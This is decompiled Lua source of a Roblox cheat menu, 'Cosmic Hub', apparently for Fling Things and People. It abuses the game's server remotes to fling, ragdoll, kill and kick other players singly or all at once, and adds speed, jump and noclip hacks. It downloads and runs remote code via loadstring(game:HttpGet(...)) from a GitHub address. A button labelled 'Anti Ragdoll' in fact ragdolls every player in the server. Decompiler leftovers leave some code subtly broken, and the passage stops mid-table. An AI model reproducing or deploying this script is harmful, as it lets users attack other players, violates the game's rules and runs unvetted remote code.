local r0_0 = game:GetService("Players")
local r1_0 = r0_0.LocalPlayer
local r2_0 = game:GetService("RunService")
local r3_0 = game:GetService("HttpService")
local r4_0 = game:GetService("ReplicatedStorage")
local r5 = game:GetService("Debris")
local r6_0 = r4_0:WaitForChild("GrabEvents")
local r7 = r4_0:WaitForChild("CharacterEvents")
local r8 = r4_0:WaitForChild("MenuToys")
local r9_0 = r6_0:WaitForChild("SetNetworkOwner")
local r10 = game:GetService("StarterGui")
local r11_0 = game:GetService("TextChatService")
if not r0_0.LocalPlayer and not r0_0:GetPropertyChangedSignal("LocalPlayer"):Wait() then
  local r12 = r0_0.LocalPlayer
end
local r13_0 = r4_0:WaitForChild("CharacterEvents"):FindFirstChild("RagdollRemote")
local r14_0 = false
local r15 = nil
local r16 = 40
local r17 = nil
local r18 = nil
local r19 = nil
local r20 = nil
if not r1_0.Character then
  local r21 = r1_0.CharacterAdded:Wait()
end
local r22 = workspace:FindFirstChild(r1_0.Name .. "SpawnedInToys")
local r23_0 = r0_0.LocalPlayer
local r24_0 = game:GetService("Workspace")
(_G or {}).BlobmanDelay = 0.00000005
local r26_0 = 1
local r27 = {}
local r28_0 = nil
local r29_0 = {}
local r30 = nil
function getAllPlayers()
  -- line: [0, 0] id: 205
  local r0 = {}
  for r4, r5 in ipairs(r0_0:GetPlayers()) do
    table.insert(r0, r5.Name)
  end
  return r0
end
function registerDropdown(r0)
  -- line: [0, 0] id: 225
  table.insert(r29_0, r0)
  r0:Refresh(getAllPlayers(), true)
end
function sendChatMessage(r0)
  -- line: [0, 0] id: 32
  if r11_0.ChatVersion == Enum.ChatVersion.TextChatService then
    r11_0.TextChannels.RBXGeneral:SendAsync(r0)
  else
    r4_0.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(r0, "All")
  end
end
task.spawn(function()
  -- line: [0, 0] id: 136
  sendChatMessage("-`C´-")
end)
local r31_0 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeffepicy/OrionGod/refs/heads/main/CosmicOrion", true))()
r31_0:MakeNotification({
  Name = "Welcome to Cosmic Hub!",
  Content = "You’re Whitelisted! wink wink",
  Image = "rbxassetid://4483345998",
  Time = 20,
})
local r32 = r31_0:MakeWindow({
  Name = "Cosmic Hub FTAP",
  HidePremium = false,
  SaveConfig = true,
  ConfigFolder = "CosmicHubFTAPConfig",
})
local r33 = r32:MakeTab({
  Name = "Player",
  Icon = "rbxassetid://6031075927",
  PremiumOnly = false,
})
local r34 = r33:AddSection({
  Name = "Movement",
})
local r25_0 = {}
r25_0.Walkspeed = false
r25_0.WalkspeedValue = 5
r25_0.InfiniteJump = false
r25_0.InfiniteJumpPower = 100
r25_0.Noclip = false
r25_0.Connections = {}
local r35_0 = game:GetService("UserInputService")
function r25_0.WalkspeedFunc()
  -- line: [0, 0] id: 42
  if r25_0.Connections.WS then
    r25_0.Connections.WS:Disconnect()
  end
  if r25_0.Walkspeed then
    r25_0.Connections.WS = r2_0.Stepped:Connect(function()
      -- line: [0, 0] id: 43
      p = r0_0.LocalPlayer
      if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChildOfClass("Humanoid") and typeof(r25_0.WalkspeedValue) == "number" then
        h = p.Character.HumanoidRootPart
        u = p.Character:FindFirstChildOfClass("Humanoid")
        h.CFrame = h.CFrame + u.MoveDirection * 16 * r25_0.WalkspeedValue / 10
      end
    end)
  end
end
function r25_0.InfiniteJumpFunc()
  -- line: [0, 0] id: 139
  if r25_0.Connections.JP then
    r25_0.Connections.JP:Disconnect()
  end
  if r25_0.InfiniteJump then
    r25_0.Connections.JP = r35_0.JumpRequest:Connect(function()
      -- line: [0, 0] id: 140
      local r0 = r0_0.LocalPlayer
      if r0 and r0.Character and r0.Character:FindFirstChildOfClass("Humanoid") then
        local r1 = r0.Character:FindFirstChildOfClass("Humanoid")
        r1:ChangeState(Enum.HumanoidStateType.Freefall)
        task.wait()
        r1:ChangeState(Enum.HumanoidStateType.Jumping)
        if r1.UseJumpPower ~= false then
          r1.JumpPower = r25_0.InfiniteJumpPower
        else
          r1.JumpHeight = math.clamp(r25_0.InfiniteJumpPower / 10, 7.2, 50)
        end
      end
    end)
  end
end
function r25_0.NoclipFunc()
  -- line: [0, 0] id: 233
  if r25_0.Connections.NC then
    r25_0.Connections.NC:Disconnect()
  end
  if r25_0.Noclip then
    r25_0.Connections.NC = r2_0.Stepped:Connect(function()
      -- line: [0, 0] id: 234
      p = r0_0.LocalPlayer
      if p and p.Character then
        for r3, r4 in ipairs(p.Character:GetDescendants()) do
          if r4:IsA("BasePart") then
            r4.CanCollide = false
          end
        end
      end
    end)
  end
end
r33:AddToggle({
  Name = "Walkspeed",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 36
    r25_0.Walkspeed = r0
    r25_0.WalkspeedFunc()
  end,
})
r33:AddSlider({
  Name = "Speed Multiplier",
  Min = 1,
  Max = 5,
  Default = 0.1,
  Increment = 0.1,
  Callback = function(r0)
    -- line: [0, 0] id: 227
    r25_0.WalkspeedValue = r0
  end,
})
r33:AddToggle({
  Name = "Infinite Jump",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 206
    r25_0.InfiniteJump = r0
    r25_0.InfiniteJumpFunc()
  end,
})
r33:AddSlider({
  Name = "Jump Power",
  Min = 16,
  Max = 500,
  Default = 16,
  Increment = 1,
  Callback = function(r0)
    -- line: [0, 0] id: 142
    r25_0.InfiniteJumpPower = r0
  end,
})
r33:AddToggle({
  Name = "Noclip",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 7
    r25_0.Noclip = r0
    r25_0.NoclipFunc()
  end,
})
local r36 = r32:MakeTab({
  Name = "Invincibility",
  Icon = "rbxassetid://4483362458",
  PremiumOnly = false,
})
local r37 = r36:AddSection({
  Name = "Anti",
})
function ragdollAllPlayers()
  -- line: [0, 0] id: 95
  if not r13_0 then
    r31_0:MakeNotification({
      Name = "Error",
      Content = "error",
      Image = "rbxassetid://4483345998",
      Time = 3,
    })
    return 
  end
  for r3, r4 in pairs(r0_0:GetPlayers()) do
    if r4.Character and r4.Character:FindFirstChild("HumanoidRootPart") then
      for r8 = 1, 150, 1 do
        r13_0:FireServer(r4.Character.HumanoidRootPart, 9999999)
        wait()
      end
    end
  end
end
r36:AddButton({
  Name = "Anti Ragdoll/Snowball",
  Callback = function()
    -- line: [0, 0] id: 127
    ragdollAllPlayers()
  end,
})
r36:AddButton({
  Name = "Destroy Void",
  Callback = function()
    -- line: [0, 0] id: 224
    r24_0.FallenPartsDestroyHeight = -100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
  end,
})
local r38_0 = {
  Players = game:GetService("Players"),
  ReplicatedStorage = game:GetService("ReplicatedStorage"),
  RunService = game:GetService("RunService"),
  LP = game.Players.LocalPlayer,
  spawnGucci = function()
    -- line: [0, 0] id: 122
    return r38_0.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", CFrame.new(0, 50000, 0) * CFrame.Angles(-0.7351, 0.9028, 0.6173), Vector3.new(0, 59.667, 0))
  end,
  setup = function()
    -- line: [0, 0] id: 62
    r38_0.spawnGucci()
    local r0_62 = r38_0.LP.Name
    local r1_62 = r24_0
    local r2 = r38_0.LP.Character or r38_0.LP.CharacterAdded:Wait()
    local r3 = r1_62:FindFirstChild(r0_62 .. "SpawnedInToys")
    local r4 = nil
    local r5 = nil
    if r3 then
      r4 = r3:FindFirstChild("CreatureBlobman")
    end
    if r4 then
      r5 = r4:FindFirstChild("Head")
    end
    if r5 then
      r5.CFrame = CFrame.new(0, 50000, 0)
      r5.Anchored = true
    end
    task.wait(0.1)
    local r6_62 = r2:WaitForChild("Humanoid")
    local r7_62 = r2:WaitForChild("HumanoidRootPart")
    local r8_62 = r7_62.Position
    local r9_62 = false
    local r10 = r4 and r4:FindFirstChild("VehicleSeat")
    if r10 and r10:IsA("VehicleSeat") then
      r7_62.CFrame = r10.CFrame + Vector3.new(0, 2, 0)
      r10:Sit(r6_62)
      r9_62 = true
    end
    r6_62:GetPropertyChangedSignal("Jump"):Connect(function()
      -- line: [0, 0] id: 64
      if r9_62 and r6_62.Jump then
        task.wait(0.02)
        r7_62.CFrame = CFrame.new(r8_62)
        r9_62 = false
      end
    end)
    r38_0.ragdollConn = r38_0.RunService.Heartbeat:Connect(function()
      -- line: [0, 0] id: 65
      if r38_0.enabled and r9_62 then
        pcall(function()
          -- line: [0, 0] id: 66
          r38_0.ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(r1_62[r0_62].HumanoidRootPart, 0)
        end)
      end
    end)
    r38_0.posCheckConn = r38_0.RunService.Heartbeat:Connect(function()
      -- line: [0, 0] id: 63
      if r38_0.enabled and (r7_62.Position - r8_62).Magnitude < 1 then
        r9_62 = false
      end
    end)
  end,
}
r36:AddToggle({
  Name = " Gucci Anti",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 141
    r38_0.enabled = r0
    if r0 then
      r38_0.setup()
    else
      if r38_0.ragdollConn then
        r38_0.ragdollConn:Disconnect()
        r38_0.ragdollConn = nil
      end
      if r38_0.posCheckConn then
        r38_0.posCheckConn:Disconnect()
        r38_0.posCheckConn = nil
      end
    end
  end,
})
r36:AddButton({
  Name = "Destroy Gucci (All)",
  Callback = function()
    -- line: [0, 0] id: 112
    for r3, r4 in r24_0:GetDescendants() do
      if r4.Name == "CreatureBlobman" then
        r4.VehicleSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
        wait(0.05)
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
      end
    end
  end,
})
local r39_0 = false
function antiGrab()
  -- line: [0, 0] id: 24
  while r39_0 do
    local r0 = task.wait()
    if r0 then
      r0 = r23_0:FindFirstChild("IsHeld")
      if r0 then
        r0 = r23_0.IsHeld.Value
        if r0 == true then
          r0 = r23_0.Character
          if r0 then
            local r1 = r0:FindFirstChild("HumanoidRootPart")
            if r1 then
              r1.Anchored = true
              while r23_0.IsHeld.Value == true do
                local r2 = r39_0
                if r2 then
                  r4_0.CharacterEvents.Struggle:FireServer(r23_0)
                  task.wait(0.001)
                else
                  break
                end
              end
              r1.Anchored = false
            end
          end
        end
      end
    else
      break
    end
  end
end
r36:AddToggle({
  Name = "Anti Grab",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 33
    r39_0 = r0
    if r39_0 then
      task.spawn(antiGrab)
    end
  end,
})
local r40_0 = false
function antiExplodeF()
  -- line: [0, 0] id: 45
  r24_0.ChildAdded:Connect(function(r0)
    -- line: [0, 0] id: 46
    if r0:IsA("Part") and r0.Name == "Part" and r40_0 then
      local r1 = r23_0.Character
      if r1 then
        local r2 = r1:FindFirstChild("HumanoidRootPart")
        local r3 = r1:FindFirstChild("Right Arm")
        if r2 and r3 and (r0.Position - r2.Position).Magnitude <= 20 then
          r2.Anchored = true
          task.wait(0.01)
          while r3:FindFirstChild("RagdollLimbPart") do
            local r5 = r3.RagdollLimbPart.CanCollide
            if r5 == true then
              task.wait(0.001)
            else
              break
            end
          end
          r2.Anchored = false
        end
      end
    end
  end)
end
r36:AddToggle({
  Name = "Anti Explode",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 111
    r40_0 = r0
    if r40_0 then
      task.spawn(antiExplodeF)
    end
  end,
})
r36:AddToggle({
  Name = "Anti Fire",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 168
    local r1_168 = {
      p = game:GetService("Players").LocalPlayer,
      rs = game:GetService("RunService"),
      w = game:GetService("Workspace"),
      mon = false,
      con = nil,
    }
    r1_168.ep = r1_168.w.Map.Hole.PoisonBigHole.ExtinguishPart
    r1_168.op = r1_168.ep.Position
    function check()
      -- line: [0, 0] id: 170
      local r1 = (r1_168.p.Character or r1_168.p.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
      local r2 = r1:FindFirstChild("FireLight")
      local r3 = r1:FindFirstChild("FireParticleEmitter")
      if r2 or r3 then
        r1_168.ep.CFrame = CFrame.new(r1.Position)
        while r2 or r3 do
          task.wait(0.1)
          r2 = r1:FindFirstChild("FireLight")
          r3 = r1:FindFirstChild("FireParticleEmitter")
          local r4 = r1_168.ep
          local r5 = CFrame.new(r1.Position)
          r4.CFrame = r5
        end
        r1_168.ep.CFrame = CFrame.new(r1_168.op)
      end
    end
    r1_168.mon = r0
    if r0 then
      if not r1_168.con then
        r1_168.con = r1_168.rs.Heartbeat:Connect(function()
          -- line: [0, 0] id: 169
          if r1_168.mon then
            check()
          end
        end)
      end
    else
      r1_168.ep.CFrame = CFrame.new(r1_168.op)
      if r1_168.con then
        r1_168.con:Disconnect()
        r1_168.con = nil
      end
    end
  end,
})
function antiLagF()
  -- line: [0, 0] id: 128
  local r0 = game.Players.LocalPlayer.Character
  if r0 then
    local r1 = r0:FindFirstChild("HumanoidRootPart")
    local r2 = r0:FindFirstChild("Humanoid")
    local r3 = game.Players.LocalPlayer:FindFirstChild("PlayerScripts") and game.Players.LocalPlayer.PlayerScripts:FindFirstChild("CharacterAndBeamMove")
    if r1 and r2 and r3 then
      r3.Disabled = antiLagT
    end
  end
end
r36:AddToggle({
  Name = "Anti Lag",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 198
    antiLagT = r0
    antiLagF()
  end,
})
function removeDetectors()
  -- line: [0, 0] id: 31
  local r0 = r1_0.Character
  if not r0 then
    return 
  end
  local r1 = r0:FindFirstChild("HumanoidRootPart")
  if not r1 then
    return 
  end
  for r5, r6 in pairs(r24_0:GetDescendants()) do
    if r6:IsA("BasePart") and (r6.Name == "LeftDetector" or r6.Name == "RightDetector") and 10 < (r1.Position - r6.Position).Magnitude then
      r6:Destroy()
    end
  end
end
function applyAntiMassless()
  -- line: [0, 0] id: 137
  while r14_0 do
    local r0 = r1_0.Character
    if r0 then
      r0 = ipairs
      for r3, r4 in r0(r1_0.Character:GetDescendants()) do
        if r4:IsA("BasePart") and r4.Massless then
          r4.Massless = false
        end
      end
    end
    task.wait(1)
  end
end
r36:AddToggle({
  Name = "Anti Blobman",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 155
    r14_0 = r0
    if r14_0 then
      task.spawn(function()
        -- line: [0, 0] id: 156
        while r14_0 do
          removeDetectors()
          task.wait(1)
        end
      end)
      task.spawn(applyAntiMassless)
    end
  end,
})
local r41 = r32:MakeTab({
  Name = "Attack",
  Icon = "rbxassetid://6031094674",
  PremiumOnly = false,
})
local r42 = r41:AddSection({
  Name = "Loop ",
})
local r43_0 = game:GetService("Players")
local r44_0 = game:GetService("RunService")
local r45_0 = r24_0
local r46_0 = game.ReplicatedStorage
local r47_0 = r43_0.LocalPlayer
local r48_0 = {}
local r49_0 = nil
local r50_0 = {
  E = false,
  S = nil,
  D = 2,
  Off = Vector3.new(5, -18.5, 0),
  H = 10000,
  Del = 0.5,
}
local r51_0 = {
  E = false,
  S = nil,
  D = 2,
  Off = Vector3.new(5, -18.5, 0),
  H = 10000,
  Del = 0.5,
}
function upd(r0)
  -- line: [0, 0] id: 1
  local r1 = {}
  for r5, r6 in ipairs(r43_0:GetPlayers()) do
    table.insert(r1, r6.Name)
  end
  r0:Refresh(r1, true)
end
function nocoll(r0)
  -- line: [0, 0] id: 220
  for r4, r5 in ipairs(r0:GetDescendants()) do
    if r5:IsA("BasePart") then
      r5.CanCollide = false
    end
  end
end
function fling(r0, r1)
  -- line: [0, 0] id: 19
  nocoll(r1.Parent)
  local r2_19 = Instance.new("BodyVelocity", r0)
  local r3 = Vector3.new(0, 1000000000, 0)
  r2_19.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
  r2_19.Velocity = r3
  r1.Jump = true
  r1.Sit = false
  task.delay(3, function()
    -- line: [0, 0] id: 20
    if r2_19.Parent then
      r2_19:Destroy()
    end
  end)
end
function above(r0, r1)
  -- line: [0, 0] id: 115
  local r2 = r0.Character and r0.Character:FindFirstChild("HumanoidRootPart")
  local r3 = nil	-- notice: implicit variable refs by block#[6]
  if r2 then
    r3 = r1 < r2.Position.Y
  else
    goto label_14	-- block#5 is visited secondly
  end
  return r3
end
function save(r0)
  -- line: [0, 0] id: 126
  local r1 = r47_0.Character
  if r1 and r1:FindFirstChild("HumanoidRootPart") then
    r0.S = r1:GetPivot()
  end
end
function ret(r0)
  -- line: [0, 0] id: 197
  local r1 = r47_0.Character
  local r2 = r1 and r1:FindFirstChild("HumanoidRootPart")
  if r2 and r0.S and r0.D < (r2.Position - r0.S.Position).Magnitude then
    r1:PivotTo(r0.S)
  end
end
function act(r0, r1_186, r2_186)
  -- line: [0, 0] id: 186
  if not r1_186.E then
    return 
  end
  if r45_0:FindFirstChild("PlotItems") and r45_0.PlotItems.PlayersInPlots:FindFirstChild(r0.Name) then
    return 
  end
  local r3_186 = r0.Character
  local r4_186 = r3_186 and r3_186:FindFirstChild("HumanoidRootPart")
  local r5_186 = r3_186 and r3_186:FindFirstChildOfClass("Humanoid")
  local r6_186 = r3_186 and r3_186:FindFirstChild("Head")
  if not r4_186 or not r5_186 or not r6_186 or r5_186.Health <= 0 or above(r0, r1_186.H) then
    return 
  end
  local r7_186 = r47_0.Character
  if not (r7_186 and r7_186:FindFirstChild("HumanoidRootPart")) then
    return 
  end
  pcall(function()
    -- line: [0, 0] id: 187
    save(r1_186)
    r7_186:PivotTo(CFrame.new(r4_186.Position + r1_186.Off))
    nocoll(r3_186)
    r46_0.GrabEvents.SetNetworkOwner:FireServer(r4_186, r4_186.CFrame)
    task.wait()
    ret(r1_186)
    task.wait(0.1)
    r46_0.GrabEvents.DestroyGrabLine:FireServer(r4_186)
    task.wait(0.1)
    if r6_186:FindFirstChild("PartOwner") and r6_186.PartOwner.Value == r47_0.Name then
      fling(r4_186, r5_186)
      if r2_186 then
        task.wait(0.1)
        r5_186.Health = 0
      end
    end
  end)
  task.wait(r1_186.Del)
end
function loop(r0, r1)
  -- line: [0, 0] id: 222
  save(r0)
  for r5 in pairs(r48_0) do
    if not r0.E then
      break
    else
      local r6 = r43_0:FindFirstChild(r5)
      if r6 then
        act(r6, r0, r1)
      end
    end
  end
end
function loopCtrl(r0_17, r1_17)
  -- line: [0, 0] id: 17
  return r44_0.Heartbeat:Connect(function()
    -- line: [0, 0] id: 18
    if r0_17.E then
      loop(r0_17, r1_17)
    end
  end)
end
local r52_0 = nil
local r53_0 = nil
local r54_0 = nil
local r55_0 = nil
function stop(r0, r1)
  -- line: [0, 0] id: 83
  r1.E = false
  if r0 then
    r0:Disconnect()
  end
  r1.S = nil
end
local r58 = {
  Name = "Select Player",
}
r58.Options = {}
function r58.Callback(r0)
  -- line: [0, 0] id: 223
  r49_0 = r43_0:FindFirstChild(r0)
end
SelectDropdown = r41:AddDropdown(r58)
r58 = {
  Name = "Players in Loop",
}
r58.Options = {}
function r58.Callback(r0)
  -- line: [0, 0] id: 81
  r49_0 = r43_0:FindFirstChild(r0)
end
LoopDropdown = r41:AddDropdown(r58)
r41:AddButton({
  Name = "Add Player",
  Callback = function()
    -- line: [0, 0] id: 184
    if r49_0 and not r48_0[r49_0.Name] then
      r48_0[r49_0.Name] = true
      upd(LoopDropdown)
    end
  end,
})
r41:AddButton({
  Name = "Remove Player",
  Callback = function()
    -- line: [0, 0] id: 103
    if r49_0 and r48_0[r49_0.Name] then
      r48_0[r49_0.Name] = nil
      r49_0 = nil
      upd(SelectDropdown)
      upd(LoopDropdown)
    end
  end,
})
r41:AddToggle({
  Name = "Loop Kick",
  Callback = function(r0)
    -- line: [0, 0] id: 159
    r50_0.E = r0
    if r0 then
      r52_0 = loopCtrl(r50_0, false)
    else
      stop(r52_0, r50_0)
    end
  end,
})
r41:AddToggle({
  Name = "Loop Kill",
  Callback = function(r0)
    -- line: [0, 0] id: 8
    r51_0.E = r0
    if r0 then
      r53_0 = loopCtrl(r51_0, true)
    else
      stop(r53_0, r51_0)
    end
  end,
})
r43_0.PlayerAdded:Connect(function()
  -- line: [0, 0] id: 129
  upd(SelectDropdown)
end)
r43_0.PlayerRemoving:Connect(function(r0)
  -- line: [0, 0] id: 35
  if r48_0[r0.Name] then
    r48_0[r0.Name] = nil
    upd(LoopDropdown)
  end
  upd(SelectDropdown)
end)
upd(SelectDropdown)
upd(LoopDropdown)
r41:AddToggle({
  Name = "Kick All",
  Callback = function(r0)
    -- line: [0, 0] id: 229
    if r0 then
      stop(r52_0, r50_0)
      r54_0 = r44_0.Heartbeat:Connect(function()
        -- line: [0, 0] id: 230
        save(r50_0)
        for r3, r4 in ipairs(r43_0:GetPlayers()) do
          if r4 ~= r47_0 then
            act(r4, r50_0, false)
          end
        end
      end)
    else
      stop(r54_0, r50_0)
    end
  end,
})
r41:AddToggle({
  Name = "Kill All",
  Callback = function(r0)
    -- line: [0, 0] id: 211
    if r0 then
      stop(r53_0, r51_0)
      r55_0 = r44_0.Heartbeat:Connect(function()
        -- line: [0, 0] id: 212
        save(r51_0)
        for r3, r4 in ipairs(r43_0:GetPlayers()) do
          if r4 ~= r47_0 then
            act(r4, r51_0, true)
          end
        end
      end)
    else
      stop(r55_0, r51_0)
    end
  end,
})
local r56 = r41:AddSection({
  Name = "Grabs",
})
local r57_0 = false
function killGrabF()
  -- line: [0, 0] id: 131
  if not r57_0 then
    return 
  end
  r24_0.ChildAdded:Connect(function(r0)
    -- line: [0, 0] id: 132
    if r0:IsA("Model") and r0.Name == "GrabParts" and r57_0 then
      local r1 = r0:FindFirstChild("GrabPart")
      if r1 and r1:FindFirstChild("WeldConstraint") then
        local r2 = r1.WeldConstraint.Part1
        if r2 and r2.Parent and r2.Parent ~= r23_0.Character then
          local r3 = r2.Parent:FindFirstChildOfClass("Humanoid")
          if r3 then
            r3.Health = 0
          end
        end
      end
    end
  end)
end
r41:AddToggle({
  Name = "Kill Grab",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 185
    r57_0 = r0
    killGrabF()
  end,
})
r58_0 = {
  S = game:GetService("UserInputService"),
  A = game:GetService("ContextActionService"),
  W = game:GetService("Workspace"),
  R = game:GetService("RunService"),
  D = game:GetService("Debris"),
  P = game:GetService("Players"),
  Enabled = false,
  Strength = 800,
}
r58_0.UI = {}
function onGrabAdded(r0_217)
  -- line: [0, 0] id: 217
  if not r58_0.Enabled then
    return 
  end
  if r0_217.Name ~= "GrabParts" then
    return 
  end
  local r1 = r0_217:FindFirstChild("GrabPart")
  if not r1 or not r1:FindFirstChild("WeldConstraint") then
    return 
  end
  local r2 = r1.WeldConstraint.Part1
  if not r2 then
    return 
  end
  local r3_217 = Instance.new("BodyVelocity")
  r3_217.MaxForce = Vector3.new(0, 0, 0)
  r3_217.Parent = r2
  local r4 = nil
  local r5_217 = nil
  local r6_217 = nil
  local r7_217 = nil
  while not r4 and r0_217.Parent and r58_0.Enabled do
    for r11, r12 in pairs(r58_0.P.LocalPlayer.PlayerGui.ContextActionGui:GetDescendants()) do
      if r12:IsA("ImageLabel") and r12.Image == "http://www.roblox.com/asset/?id=9603678090" then
        r4 = r12.Parent
        break
      end
    end
    r58_0.R.Heartbeat:Wait()
  end
  if r4 and r58_0.Enabled then
    function launch()
      -- line: [0, 0] id: 219
      r3_217.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
      r3_217.Velocity = r58_0.W.CurrentCamera.CFrame.LookVector * r58_0.Strength
    end
    r5_217 = r4.MouseButton1Up:Connect(launch)
    r6_217 = r4.MouseButton1Down:Connect(launch)
  end
  r7_217 = r0_217:GetPropertyChangedSignal("Parent"):Connect(function()
    -- line: [0, 0] id: 218
    if not r0_217.Parent then
      if r5_217 then
        r5_217:Disconnect()
      end
      if r6_217 then
        r6_217:Disconnect()
      end
      if r7_217 then
        r7_217:Disconnect()
      end
      r58_0.D:AddItem(r3_217, 1)
    end
  end)
end
function toggleConnections(r0)
  -- line: [0, 0] id: 118
  if r0 then
    r58_0.GrabConn = r58_0.W.ChildAdded:Connect(onGrabAdded)
  elseif r58_0.GrabConn then
    r58_0.GrabConn:Disconnect()
    r58_0.GrabConn = nil
  end
end
r41:AddToggle({
  Name = "Strength",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 153
    r58_0.Enabled = r0
    toggleConnections(r0)
  end,
})
r41:AddSlider({
  Name = "Launch Strength",
  Min = 10,
  Max = 3000,
  Default = r58_0.Strength,
  Increment = 50,
  Callback = function(r0)
    -- line: [0, 0] id: 67
    r58_0.Strength = r0
  end,
})
local r60_0 = game:GetService("Players").LocalPlayer
local r61 = r41:AddSection({
  Name = "Snowball Ragdoll",
})
local r62_0 = {
  P = game:GetService("Players"),
  RS = game:GetService("ReplicatedStorage"),
  W = r24_0,
  LP = game.Players.LocalPlayer,
  Toy = game:GetService("ReplicatedStorage"):WaitForChild("MenuToys"),
  Set = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
  TP = nil,
  TE = false,
  SE = false,
  AE = false,
  DD = nil,
}
r62_0.R = {}
function getAllPlayers()
  -- line: [0, 0] id: 110
  local r0 = {}
  for r4, r5 in ipairs(r62_0.P:GetPlayers()) do
    if r5 ~= r62_0.LP then
      table.insert(r0, r5.Name)
    end
  end
  return r0
end
function updateDropdown()
  -- line: [0, 0] id: 91
  if r62_0.DD then
    r62_0.DD:Refresh(getAllPlayers(), true)
  end
end
r62_0.P.PlayerAdded:Connect(updateDropdown)
r62_0.P.PlayerRemoving:Connect(updateDropdown)
function spawnToy(r0_56, r1_56)
  -- line: [0, 0] id: 56
  task.spawn(function()
    -- line: [0, 0] id: 57
    local r0_57 = r62_0.Toy:FindFirstChild("SpawnToyRemoteFunction")
    if r0_57 then
      pcall(function()
        -- line: [0, 0] id: 58
        r0_57:InvokeServer(r0_56, CFrame.new(r1_56), Vector3.new())
      end)
    end
  end)
end
function tpSnow()
  -- line: [0, 0] id: 88
  while r62_0.AE do
    local r0 = r62_0.W:FindFirstChild(r62_0.LP.Name .. "SpawnedInToys")
    if r0 then
      for r4, r5 in pairs(r62_0.R) do
        local r6 = r5.Character
        local r7 = r6 and r6:FindFirstChild("HumanoidRootPart")
        if r7 then
          for r11, r12 in ipairs(r0:GetChildren()) do
            if r12:IsA("Model") and r12.Name == "BallSnowball" then
              for r16, r17 in ipairs(r12:GetDescendants()) do
                if r17:IsA("BasePart") then
                  r17.Position = r7.Position
                end
              end
            end
          end
        end
      end
    end
    task.wait(0.1)
  end
end
function autoBlob()
  -- line: [0, 0] id: 86
  while r62_0.AE do
    r62_0.R = {}
    local r0 = pairs
    for r3, r4 in r0(r62_0.P:GetPlayers()) do
      if r4 ~= r62_0.LP and r4.Character then
        local r5 = r4.Character:FindFirstChildOfClass("Humanoid")
        if r5 and r5.SeatPart and r5.SeatPart.Parent.Name == "CreatureBlobman" then
          table.insert(r62_0.R, r4)
          local r6 = r62_0.LP.Character and r62_0.LP.Character:FindFirstChild("HumanoidRootPart")
          if r6 then
            spawnToy("BallSnowball", r6.Position + Vector3.new(0, 2, 0))
          end
        end
      end
    end
    task.wait(0.1)
  end
end
function spawnBalls()
  -- line: [0, 0] id: 178
  while r62_0.SE do
    local r0 = r62_0.LP.Character and r62_0.LP.Character:FindFirstChild("HumanoidRootPart")
    if r0 then
      spawnToy("BallSnowball", r0.Position + Vector3.new(0, 2, 0))
    end
    task.wait(1)
  end
end
function tpBall()
  -- line: [0, 0] id: 3
  while r62_0.TE do
    local r0 = r62_0.W:FindFirstChild(r62_0.LP.Name .. "SpawnedInToys")
    if r0 and r62_0.TP then
      local r1 = r62_0.P:FindFirstChild(r62_0.TP)
      local r2 = r1 and r1.Character
      local r3 = r2 and r2:FindFirstChild("HumanoidRootPart")
      if r3 then
        for r7, r8 in ipairs(r0:GetChildren()) do
          if r8:IsA("Model") and r8.Name == "BallSnowball" then
            for r12, r13 in ipairs(r8:GetDescendants()) do
              if r13:IsA("BasePart") then
                r13.Position = r3.Position
              end
            end
          end
        end
      end
    end
    task.wait(0.1)
  end
end
r62_0.DD = r41:AddDropdown({
  Name = "Select Player (Snowball)",
  Options = getAllPlayers(),
  Default = nil,
  Callback = function(r0)
    -- line: [0, 0] id: 232
    r62_0.TP = r0
  end,
})
updateDropdown()
r41:AddToggle({
  Name = "Snowball Ragdoll",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 123
    r62_0.TE = r0
    if r0 then
      task.spawn(tpBall)
    end
  end,
})
r41:AddToggle({
  Name = "Auto Spawn Snowballs",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 5
    r62_0.SE = r0
    if r0 then
      task.spawn(spawnBalls)
    end
  end,
})
r41:AddToggle({
  Name = "Auto Kick Blob (Snowball Spam)",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 191
    r62_0.AE = r0
    if r0 then
      task.spawn(autoBlob)
      task.spawn(tpSnow)
    end
  end,
})
if not game:IsLoaded() then
  game.Loaded:Wait()
end
if not syn or not protectgui then
  getgenv().protectgui = function()
    -- line: [0, 0] id: 214
  end
end
local r63 = r32:MakeTab({
  Name = "Blobman Loop",
  Icon = "rbxassetid://6031091005",
  PremiumOnly = false,
})
local r64 = r63:AddSection({
  Name = "Blobman Target",
})
local r65_0 = {
  Players = game:GetService("Players"),
  ReplicatedStorage = game:GetService("ReplicatedStorage"),
  Workspace = game:GetService("Workspace"),
  LocalPlayer = nil,
}
r65_0.TargetList = r25_0.TargetList or {}
r65_0.selectedPlayer = nil
r65_0.toggleEnabled = false
r65_0.teleportAllEnabled = false
r65_0.teleportDelay = 1
r65_0.currentBlobman = nil
r65_0.masterRunning = false
r65_0.blobalter = 1
r65_0.ORIGIN_POS = nil
r65_0.MAX_TELEPORT_DIST = 500
r65_0.targetPlayerDropdown = nil
